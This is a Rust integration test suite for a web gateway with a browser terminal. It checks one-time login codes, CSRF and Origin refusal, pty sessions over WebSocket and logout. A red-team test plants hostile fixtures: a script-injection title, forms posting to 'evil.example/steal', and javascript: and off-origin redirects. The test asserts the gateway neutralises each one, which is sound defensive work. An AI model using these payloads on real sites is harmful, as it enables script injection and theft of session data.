//! The front end without a Host: the real helper in `--dev` (as this user, a fake shell wrapper
//! that proves the pty) and the real gateway, driven as a browser would. A door-style login code
//! opens one session exactly once; the member page is the member's; the terminal runs the wrapper
//! under a pty over the WebSocket; a foreign Origin and a wrong CSRF token are refused; the
//! sessions page lists the session; logout revokes it. On Linux this also exercises the helper's
//! `SO_PEERCRED` check. The journey (`journey.d/jweb-frontend.sh`) adds the Host-backed rows.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
#[allow(unused_imports)]
use std::os::unix::fs::PermissionsExt;
use std::time::{Duration, Instant};

struct Procs(Vec<Child>, PathBuf);
impl Drop for Procs {
    fn drop(&mut self) {
        for child in &mut self.0 {
            let _ = child.kill();
            let _ = child.wait();
        }
        let _ = std::fs::remove_dir_all(&self.1);
    }
}

fn helper_binary() -> PathBuf {
    let gateway = PathBuf::from(env!("CARGO_BIN_EXE_mini-web"));
    let helper = gateway.with_file_name("mini-web-spawn");
    if !helper.exists() {
        let status = Command::new(env!("CARGO"))
            .args(["build", "-p", "minidregg-mini-web-spawn"])
            .arg("--target-dir")
            .arg(gateway.parent().unwrap().parent().unwrap())
            .status()
            .expect("cargo build mini-web-spawn");
        assert!(status.success());
    }
    helper
}

fn free_port() -> u16 {
    std::net::TcpListener::bind("127.0.0.1:0").unwrap().local_addr().unwrap().port()
}

struct Reply {
    status: u16,
    headers: Vec<(String, String)>,
    body: String,
}

impl Reply {
    fn header(&self, name: &str) -> Option<&str> {
        self.headers.iter().find(|(k, _)| k.eq_ignore_ascii_case(name)).map(|(_, v)| v.as_str())
    }
}

fn http(port: u16, method: &str, path: &str, headers: &[(&str, &str)], body: &str) -> Reply {
    let mut stream = TcpStream::connect(("127.0.0.1", port)).unwrap();
    stream.set_read_timeout(Some(Duration::from_secs(30))).unwrap();
    let mut head = format!("{method} {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n");
    for (k, v) in headers {
        head.push_str(&format!("{k}: {v}\r\n"));
    }
    if method == "POST" {
        head.push_str(&format!("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n", body.len()));
    }
    head.push_str("\r\n");
    stream.write_all(head.as_bytes()).unwrap();
    stream.write_all(body.as_bytes()).unwrap();
    let mut bytes = Vec::new();
    stream.read_to_end(&mut bytes).unwrap();
    let text = String::from_utf8_lossy(&bytes).into_owned();
    let (head, body) = text.split_once("\r\n\r\n").expect("a head");
    let mut lines = head.split("\r\n");
    let status = lines.next().unwrap().split(' ').nth(1).unwrap().parse().unwrap();
    let headers = lines.filter_map(|l| l.split_once(':')).map(|(k, v)| (k.trim().to_owned(), v.trim().to_owned())).collect();
    Reply { status, headers, body: body.to_owned() }
}

fn csrf_of(html: &str) -> String {
    let at = html.find("name=\"csrf\" value=\"").expect("a csrf field") + "name=\"csrf\" value=\"".len();
    html[at..].split('"').next().unwrap().to_owned()
}

/// A masked client frame (RFC 6455 §5.3).
fn client_frame(opcode: u8, payload: &[u8]) -> Vec<u8> {
    let mask = [0x12u8, 0x34, 0x56, 0x78];
    let mut out = vec![0x80 | opcode];
    if payload.len() < 126 {
        out.push(0x80 | payload.len() as u8);
    } else {
        out.push(0x80 | 126);
        out.extend_from_slice(&(payload.len() as u16).to_be_bytes());
    }
    out.extend_from_slice(&mask);
    out.extend(payload.iter().enumerate().map(|(i, b)| b ^ mask[i % 4]));
    out
}

/// Read server frames until `wanted` appears in the concatenated payloads (or the deadline).
fn read_until(stream: &mut TcpStream, buf: &mut Vec<u8>, wanted: &str, deadline: Instant) -> String {
    let mut out = Vec::new();
    while Instant::now() < deadline {
        let mut chunk = [0u8; 4096];
        match stream.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => buf.extend_from_slice(&chunk[..n]),
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock || e.kind() == std::io::ErrorKind::TimedOut => {}
            Err(_) => break,
        }
        loop {
            if buf.len() < 2 {
                break;
            }
            let op = buf[0] & 0x0f;
            let mut len = (buf[1] & 0x7f) as usize;
            let mut off = 2;
            if len == 126 {
                if buf.len() < 4 {
                    break;
                }
                len = u16::from_be_bytes([buf[2], buf[3]]) as usize;
                off = 4;
            }
            if buf.len() < off + len {
                break;
            }
            let payload: Vec<u8> = buf.drain(..off + len).skip(off).collect();
            if op == 0x1 || op == 0x2 {
                out.extend_from_slice(&payload);
            }
        }
        if String::from_utf8_lossy(&out).contains(wanted) {
            break;
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[test]
fn a_login_code_opens_one_session_whose_terminal_runs_as_the_member_until_logout() {
    let helper = helper_binary();
    let gateway = PathBuf::from(env!("CARGO_BIN_EXE_mini-web"));
    let scratch = std::env::temp_dir().join(format!("mini-web-dev-{}", std::process::id()));
    // Unix sockets need a short path: a short runtime dir beside the system temp dir.
    let run = PathBuf::from(format!("/tmp/mwd{}", std::process::id() % 100000));
    let _ = std::fs::remove_dir_all(&scratch);
    let _ = std::fs::remove_dir_all(&run);
    std::fs::create_dir_all(scratch.join("state")).unwrap();
    std::fs::create_dir_all(scratch.join("home")).unwrap();
    std::fs::create_dir_all(&run).unwrap();
    let wrapper = scratch.join("wrapper.sh");
    std::fs::write(
        &wrapper,
        "#!/bin/sh\nprintf 'mini> '\nwhile IFS= read -r line; do\n  case \"$line\" in\n    exit) exit 0;;\n    whoami) printf '\\r\\nsubject 4242 tty=%s workspace %s\\r\\nmini> ' \"$( [ -t 0 ] && echo yes || echo no )\" \"$5\";;\n    *) printf '\\r\\nmini> ';;\n  esac\ndone\n",
    )
    .unwrap();
    std::fs::set_permissions(&wrapper, std::os::unix::fs::PermissionsExt::from_mode(0o700)).unwrap();
    let config = scratch.join("dev.json");
    std::fs::write(
        &config,
        format!(
            "{{\"mini\":\"{t}\",\"host\":\"{t}\",\"config\":\"/dev/null\",\"socket\":\"/dev/null\",\"wrapper\":\"{w}\",\"sessions\":{{\"alice\":{{\"workspace\":\"{s}/ws\",\"home\":\"{s}/home\"}}}}}}",
            t = if Path::new("/usr/bin/true").exists() { "/usr/bin/true" } else { "/bin/true" },
            w = wrapper.display(),
            s = scratch.display()
        ),
    )
    .unwrap();
    let sock = run.join("spawn.sock");
    let helper_child = Command::new(&helper)
        .arg("--dev").arg(&config).arg("--socket").arg(&sock).arg("--state").arg(scratch.join("state")).arg("--run").arg(&run)
        .stdout(Stdio::null()).stderr(std::fs::File::create(scratch.join("helper.log")).unwrap())
        .spawn()
        .unwrap();
    let port = free_port();
    let origin = format!("http://127.0.0.1:{port}");
    let gateway_child = Command::new(&gateway)
        .args(["--listen", &format!("127.0.0.1:{port}"), "--helper"]).arg(&sock).args(["--origin", &origin, "--shutdown", "the end of this test"])
        .stdout(Stdio::null()).stderr(std::fs::File::create(scratch.join("gateway.log")).unwrap())
        .spawn()
        .unwrap();
    let logs = || format!("helper: {}\ngateway: {}", std::fs::read_to_string(scratch.join("helper.log")).unwrap_or_default(), std::fs::read_to_string(scratch.join("gateway.log")).unwrap_or_default());
    let _procs = Procs(vec![helper_child, gateway_child], run.clone());
    let deadline = Instant::now() + Duration::from_secs(20);
    while Instant::now() < deadline && !(sock.exists() && TcpStream::connect(("127.0.0.1", port)).is_ok()) {
        std::thread::sleep(Duration::from_millis(50));
    }
    // The door's record: name and expiry under the code's SHA-256.
    let code = mini_web_spawn::new_token().unwrap();
    std::fs::write(
        scratch.join("state/logins").join(format!("{}.json", mini_web_spawn::sha256_hex(code.as_bytes()))),
        format!("{{\"name\":\"alice\",\"expires\":{}}}", mini_web_spawn::now() + 600),
    )
    .unwrap();
    let same = [("Origin", origin.as_str()), ("Sec-Fetch-Site", "same-origin")];

    let confirm = http(port, "GET", &format!("/login/{code}"), &[], "");
    assert_eq!(confirm.status, 200);
    assert!(confirm.body.contains("action=\"/login\""), "{}", confirm.body);
    assert!(confirm.body.contains("Content-Security-Policy") || confirm.header("Content-Security-Policy").is_some());

    let login = http(port, "POST", "/login", &same, &format!("code={code}"));
    assert_eq!(login.status, 303, "{}\n{}", login.body, logs());
    let cookie = login.header("Set-Cookie").expect("a cookie").split(';').next().unwrap().to_owned();
    assert!(cookie.starts_with("mini_session="), "{cookie}");
    assert!(login.header("Set-Cookie").unwrap().contains("HttpOnly; SameSite=Strict"));
    let again = http(port, "POST", "/login", &same, &format!("code={code}"));
    assert_eq!(again.status, 403, "a login code works once");

    let cookie_header = [("Cookie", cookie.as_str())];
    let home = http(port, "GET", "/", &cookie_header, "");
    assert!(home.body.contains("class=\"me\"") && home.body.contains(">alice<"), "{}", home.body);
    assert!(!home.body.contains("public reader"));
    assert!(home.body.contains("Everything on this box is world-readable"));
    // No Host behind this test: the body cannot start, and the page says so as a refusal, never a blank.
    assert!(home.body.contains("outcome refused"), "{}", home.body);
    let csrf = csrf_of(&home.body);

    let evil = http(port, "POST", "/term", &[("Cookie", cookie.as_str()), ("Origin", "https://evil.example")], &format!("csrf={csrf}"));
    assert_eq!(evil.status, 403, "a foreign Origin is refused");
    let wrong = http(port, "POST", "/term", &[("Cookie", cookie.as_str()), ("Origin", origin.as_str())], "csrf=nope");
    assert_eq!(wrong.status, 403, "a wrong CSRF token is refused");
    let fragment = http(port, "GET", "/term", &[("Cookie", cookie.as_str()), ("X-Mini-Fragment", "1")], "");
    assert_eq!(fragment.header("X-Mini-Title"), Some("Terminal"));
    assert!(!fragment.body.contains("<html"), "a fragment is the stage only");

    let opened = http(port, "POST", "/term", &[("Cookie", cookie.as_str()), ("Origin", origin.as_str())], &format!("csrf={csrf}&cols=100&rows=30"));
    assert_eq!(opened.status, 303);
    let term_path = opened.header("Location").unwrap().to_owned();
    let term_page = http(port, "GET", &term_path, &cookie_header, "");
    let ws_path = term_page.body.split("data-ws=\"").nth(1).expect("a data-ws").split('"').next().unwrap().to_owned();
    assert!(term_page.body.contains("xterm.js"), "the terminal page loads the vendored xterm");

    // The WebSocket: handshake with the cookie and our Origin, then whoami through the pty.
    let mut ws = TcpStream::connect(("127.0.0.1", port)).unwrap();
    ws.set_read_timeout(Some(Duration::from_millis(300))).unwrap();
    ws.write_all(
        format!(
            "GET {ws_path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nOrigin: {origin}\r\nCookie: {cookie}\r\n\r\n"
        )
        .as_bytes(),
    )
    .unwrap();
    let mut head = Vec::new();
    let deadline = Instant::now() + Duration::from_secs(10);
    while !head.windows(4).any(|w| w == b"\r\n\r\n") && Instant::now() < deadline {
        let mut b = [0u8; 1024];
        if let Ok(n) = ws.read(&mut b) {
            head.extend_from_slice(&b[..n]);
        }
    }
    // The first frame (the replay ring) may arrive with the handshake: keep what follows the head.
    let end = head.windows(4).position(|w| w == b"\r\n\r\n").expect("a handshake head") + 4;
    let mut frames: Vec<u8> = head.split_off(end);
    let head_text = String::from_utf8_lossy(&head).into_owned();
    assert!(head_text.starts_with("HTTP/1.1 101"), "{head_text}");
    assert!(head_text.contains("Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo="));
    let prompt = read_until(&mut ws, &mut frames, "mini>", Instant::now() + Duration::from_secs(10));
    assert!(prompt.contains("mini>"), "{prompt}");
    ws.write_all(&client_frame(0x1, b"{\"resize\":[120,40]}")).unwrap();
    ws.write_all(&client_frame(0x2, b"whoami\r")).unwrap();
    let answer = read_until(&mut ws, &mut frames, "subject 4242", Instant::now() + Duration::from_secs(10));
    assert!(answer.contains("subject 4242 tty=yes"), "the wrapper runs under a pty: {answer}");
    assert!(answer.contains("/ws"), "the workspace path reached the wrapper as its argument: {answer}");
    ws.write_all(&client_frame(0x8, &1000u16.to_be_bytes())).unwrap();
    drop(ws);

    // A foreign Origin on the upgrade is refused before any handshake.
    let mut bad = TcpStream::connect(("127.0.0.1", port)).unwrap();
    bad.write_all(format!("GET {ws_path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: x\r\nSec-WebSocket-Version: 13\r\nOrigin: https://evil.example\r\nCookie: {cookie}\r\n\r\n").as_bytes()).unwrap();
    let mut text = String::new();
    let _ = bad.read_to_string(&mut text);
    assert!(text.starts_with("HTTP/1.1 403"), "{text}");

    let sessions = http(port, "GET", "/sessions", &cookie_header, "");
    assert_eq!(sessions.status, 200);
    assert!(sessions.body.contains("this one"), "{}", sessions.body);
    let terms = http(port, "GET", "/term", &cookie_header, "");
    assert!(terms.body.contains("<td>attached</td>") || terms.body.contains("<td>waiting</td>") || terms.body.contains("<td>ended</td>"), "{}", terms.body);

    let out = http(port, "POST", "/logout", &[("Cookie", cookie.as_str()), ("Origin", origin.as_str())], &format!("csrf={csrf}"));
    assert_eq!(out.status, 303);
    assert!(out.header("Set-Cookie").unwrap().contains("Max-Age=0"));
    let after = http(port, "GET", "/term", &cookie_header, "");
    assert_eq!(after.status, 401, "the revoked cookie opens nothing");
    let public = http(port, "GET", "/", &[], "");
    assert!(public.body.contains("public reader"), "{}", public.body);
    assert_eq!(http(port, "GET", "/assets/vendor/xterm.js", &[], "").header("Cache-Control"), Some("public, max-age=3600"));
    assert_eq!(http(port, "GET", "/healthz", &[], "").body, "ok");
}

/// Red team (docs/review/2026-10-27-redteam/REDTEAM.md): what a body answers reaches the page
/// shell, and a stranger's words reach the body's answer (a document's name in the title, a
/// grain's origin in a form). A stand-in body (the real helper spawns it on its root-only listener
/// exactly as it spawns `mini web --body`) answers with planted titles, a form that posts to
/// another origin, and redirects elsewhere; the real gateway must keep every one inert: the title
/// escaped in the shell, the CSP forbidding inline script, the session's CSRF token only in forms
/// that post here, and no redirect off this origin.
#[test]
fn a_planted_body_answer_stays_inert_in_the_shell() {
    let helper = helper_binary();
    let gateway = PathBuf::from(env!("CARGO_BIN_EXE_mini-web"));
    let scratch = std::env::temp_dir().join(format!("mini-web-redteam-{}", std::process::id()));
    let run = PathBuf::from(format!("/tmp/mwr{}", std::process::id() % 100000));
    let _ = std::fs::remove_dir_all(&scratch);
    let _ = std::fs::remove_dir_all(&run);
    std::fs::create_dir_all(scratch.join("state")).unwrap();
    std::fs::create_dir_all(scratch.join("home")).unwrap();
    std::fs::create_dir_all(&run).unwrap();
    let body = scratch.join("fake-body.py");
    std::fs::write(
        &body,
        r#"#!/usr/bin/env python3
# A stand-in for `mini web --body`: serves the inherited listener on fd 3 with planted answers.
import socket
listener = socket.socket(fileno=3)
TITLE = "</title><script>alert(1)</script>\u202egnp.exe"
STAGE = ('<form method="post" action="https://evil.example/steal"><input name="x"></form>'
         '<form method="post" action="//evil.example/x"></form>'
         '<form method="post" action="/doc/a/append"><input name="text"></form>')
while True:
    conn, _ = listener.accept()
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = conn.recv(65536)
        if not chunk:
            break
        data += chunk
    path = data.split(b"\r\n", 1)[0].split(b" ")[1].decode()
    if path == "/redirect-js":
        head, html = "HTTP/1.1 303 See Other\r\nLocation: javascript:alert(1)\r\n", ""
    elif path == "/redirect-far":
        head, html = "HTTP/1.1 303 See Other\r\nLocation: //evil.example/\r\n", ""
    else:
        head, html = "HTTP/1.1 200 OK\r\nX-Mini-Title: " + TITLE + "\r\n", STAGE
    payload = html.encode()
    conn.sendall((head + "Content-Type: text/html\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(payload)).encode() + payload)
    conn.close()
"#,
    )
    .unwrap();
    std::fs::set_permissions(&body, std::os::unix::fs::PermissionsExt::from_mode(0o700)).unwrap();
    let config = scratch.join("dev.json");
    std::fs::write(
        &config,
        format!(
            "{{\"mini\":\"{b}\",\"host\":\"{t}\",\"config\":\"/dev/null\",\"socket\":\"/dev/null\",\"wrapper\":\"{t}\",\"sessions\":{{\"alice\":{{\"workspace\":\"{s}/ws\",\"home\":\"{s}/home\"}}}}}}",
            b = body.display(),
            t = if Path::new("/usr/bin/true").exists() { "/usr/bin/true" } else { "/bin/true" },
            s = scratch.display()
        ),
    )
    .unwrap();
    let sock = run.join("spawn.sock");
    let helper_child = Command::new(&helper)
        .arg("--dev").arg(&config).arg("--socket").arg(&sock).arg("--state").arg(scratch.join("state")).arg("--run").arg(&run)
        .stdout(Stdio::null()).stderr(std::fs::File::create(scratch.join("helper.log")).unwrap())
        .spawn()
        .unwrap();
    let port = free_port();
    let origin = format!("http://127.0.0.1:{port}");
    let gateway_child = Command::new(&gateway)
        .args(["--listen", &format!("127.0.0.1:{port}"), "--helper"]).arg(&sock)
        .args(["--origin", &origin, "--frame-src", "https://*.demo.dregg.online"])
        .stdout(Stdio::null()).stderr(std::fs::File::create(scratch.join("gateway.log")).unwrap())
        .spawn()
        .unwrap();
    let logs = || format!("helper: {}\ngateway: {}", std::fs::read_to_string(scratch.join("helper.log")).unwrap_or_default(), std::fs::read_to_string(scratch.join("gateway.log")).unwrap_or_default());
    let _procs = Procs(vec![helper_child, gateway_child], run.clone());
    let deadline = Instant::now() + Duration::from_secs(20);
    while Instant::now() < deadline && !(sock.exists() && TcpStream::connect(("127.0.0.1", port)).is_ok()) {
        std::thread::sleep(Duration::from_millis(50));
    }
    let code = mini_web_spawn::new_token().unwrap();
    std::fs::write(
        scratch.join("state/logins").join(format!("{}.json", mini_web_spawn::sha256_hex(code.as_bytes()))),
        format!("{{\"name\":\"alice\",\"expires\":{}}}", mini_web_spawn::now() + 600),
    )
    .unwrap();
    let login = http(port, "POST", "/login", &[("Origin", origin.as_str()), ("Sec-Fetch-Site", "same-origin")], &format!("code={code}"));
    assert_eq!(login.status, 303, "{}\n{}", login.body, logs());
    let cookie = login.header("Set-Cookie").unwrap().split(';').next().unwrap().to_owned();
    let jar = [("Cookie", cookie.as_str())];

    let page = http(port, "GET", "/doc/planted", &jar, "");
    assert_eq!(page.status, 200, "{}\n{}", page.body, logs());
    let lower = page.body.to_ascii_lowercase();
    assert!(!lower.contains("<script>alert"), "the planted title is escaped in <title>, <h1> and data-title:\n{}", page.body);
    assert!(page.body.contains("&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;[U+202E]gnp.exe"), "{}", page.body);
    let csp = page.header("Content-Security-Policy").expect("a CSP");
    let script = csp.split(';').map(str::trim).find(|d| d.starts_with("script-src")).expect("a script-src");
    assert_eq!(script, "script-src 'self'", "no inline script, no eval, no other origin: {csp}");
    assert!(csp.contains("default-src 'none'") && csp.contains("base-uri 'none'") && csp.contains("frame-ancestors 'none'"), "{csp}");
    assert!(csp.contains("form-action 'self' https://*.demo.dregg.online"), "a grain's bootstrap may post to the grain origins and nowhere else: {csp}");
    let stage = page.body.split("<main").nth(1).unwrap();
    let forms: Vec<&str> = stage.split("<form").skip(1).collect();
    assert_eq!(forms.len(), 3, "{stage}");
    assert!(!forms[0].contains("csrf") && !forms[1].contains("csrf"), "the session's token never goes to another origin:\n{stage}");
    assert!(forms[2].contains("name=\"csrf\""), "a same-origin form carries it:\n{stage}");

    let fragment = http(port, "GET", "/doc/planted", &[("Cookie", cookie.as_str()), ("X-Mini-Fragment", "1")], "");
    let title = fragment.header("X-Mini-Title").unwrap();
    assert!(!title.contains('\r') && !title.contains('\n'), "{title:?}");

    for far in ["/redirect-js", "/redirect-far"] {
        let reply = http(port, "GET", far, &jar, "");
        assert_ne!(reply.status, 303, "{far}: a body redirect off this origin is refused: {:?}", reply.header("Location"));
        assert!(reply.header("Location").is_none(), "{far}");
    }
}
